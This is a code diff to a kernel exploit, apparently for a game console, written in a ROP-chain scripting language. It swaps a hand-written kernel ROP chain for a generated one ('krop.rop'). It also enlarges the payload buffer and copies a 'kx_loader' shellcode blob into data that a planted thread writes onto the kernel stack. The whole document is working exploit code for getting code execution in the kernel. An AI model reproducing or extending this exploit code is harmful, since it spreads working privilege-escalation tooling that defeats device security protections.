@@ -6,7 +6,7 @@ data
 
 	buffer ioctl[0x400];
 	buffer crap[0x100];
-	buffer our_data[0x404];
+	buffer our_data[0x1000];
 	variable file_uid = -1;
 	variable kernel_stack_base = -1;
 	variable sysmem_base;
@@ -37,14 +37,18 @@ data
 	buffer args_buf_first[0x10];
 	buffer args_buf_second[0x10];
 	buffer kernel_ropchain[0x100];
+	buffer krop[0x400];
 
 	variable plant_thread_id;
 	variable plant_stack_base;
 
-	symbol stack_shellcode_offset = 0x200;
+	symbol stack_shellcode_offset = 0x300;
 	symbol sysmem_shellcode_offset = 0x27640;
 	symbol stack_rop_offset = 4;
 	symbol kstack_offset_to_data = 1784;
+	variable kx_loader_addr;
+
+	#include "../build/kx_loader.rop"
 }
 
 code : entry
@@ -158,6 +162,7 @@ code : entry
 	// layout: [ ldm_gadget ] [ kernel ropchain .... ] ... [ payload? ]
 	// remember: we only have 0x400 bytes, and the less we use the better
 
+#if 0
 	// kernel ropchain
 	// can do the define trick because preprocessor runs before erb
 	#define NEXT kernel_ropchain+4*<%=i+=1%>
@@ -188,9 +193,21 @@ code : entry
 
 	// kernel ropchain end
 	memcpy(our_data + stack_rop_offset, kernel_ropchain, 0x100);
+#endif
+
+	add([kernel_stack_base], kstack_offset_to_data);
+	add(&return, stack_shellcode_offset);
+	store(&return, kx_loader_addr);
+
+	PRINTF("krop start\n");
+	#include "../build/krop.rop"
+	PRINTF("krop end\n");
+	memcpy(our_data + stack_rop_offset, krop, 0x300);
 
 	// set up shellcode
-	store(0xE7FE, our_data + stack_shellcode_offset);
+	// store(0xE7FE, our_data + stack_shellcode_offset);
+	memcpy(our_data + stack_shellcode_offset, kx_loader, 0x400);
+	PRINTF("shellcode end\n");
 
 	// after the plant thread wakes up, it should copy our_data into kernel stack
 
